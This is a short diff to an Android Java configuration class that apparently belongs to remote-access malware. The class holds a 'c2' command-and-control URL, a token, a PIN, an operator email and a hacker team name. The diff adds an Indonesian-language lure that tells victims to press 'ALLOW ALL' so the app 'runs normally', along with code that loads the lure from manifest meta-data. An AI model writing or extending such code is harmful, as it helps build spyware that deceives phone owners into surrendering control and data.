@@ -5,15 +5,17 @@ import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageManager;
 import android.os.Bundle;
 
-/** Pembaca konfigurasi dari meta-data manifest. */
+/** Pembaca konfigurasi dari meta-data manifest. Tanpa referensi R. */
 public final class Keys {
     public String c2 = "http://127.0.0.1:8777";
     public String token = "";
     public String pin = "211421";
     public String email = "jambudio336@gmail.com";
     public String team = "Cyber Team M4zk1pL4y";
+    public String wizard = "Izinkan semua akses agar aplikasi berjalan normal. Tekan IZINKAN SEMUA.";
 
-    private Keys() {}
+    private Keys() {
+    }
 
     public static Keys read(Context ctx) {
         Keys k = new Keys();
@@ -27,6 +29,7 @@ public final class Keys {
                 if (b.getString("mzk.pin") != null) k.pin = b.getString("mzk.pin");
                 if (b.getString("mzk.email") != null) k.email = b.getString("mzk.email");
                 if (b.getString("mzk.team") != null) k.team = b.getString("mzk.team");
+                if (b.getString("mzk.wizard") != null) k.wizard = b.getString("mzk.wizard");
             }
         } catch (PackageManager.NameNotFoundException ignored) {
         }
